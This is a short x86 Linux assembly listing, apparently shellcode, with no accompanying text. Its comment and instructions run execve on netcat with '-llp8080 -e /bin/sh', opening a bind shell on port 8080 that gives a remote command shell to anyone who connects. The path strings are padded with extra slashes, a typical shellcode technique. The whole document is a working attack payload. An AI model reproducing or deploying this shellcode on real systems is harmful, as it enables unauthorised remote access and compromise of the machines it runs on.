#execve("/usr/bin//nc",{"/usr/bin//nc","-llp8080","-e////bin/sh",NULL},NULL)

.global _start
_start:
	xor %edx,%edx
	push %edx
	push $0x636e2f2f
	push $0x6e69622f
	push $0x7273752f
	mov %esp,%ebx
	
	push %edx
	push $0x30383038
	push $0x706c6c2d
	mov %esp,%eax
	push %edx
	push $0x68732f6e
	push $0x69622f2f
	push $0x2f2f652d
	mov %esp,%ecx
	push %edx
	push %ecx
	push %eax
	push %ebx
	mov %esp,%ecx
	
	xor %eax,%eax
	lea 0xb(%edx),%eax
	int $0x80 
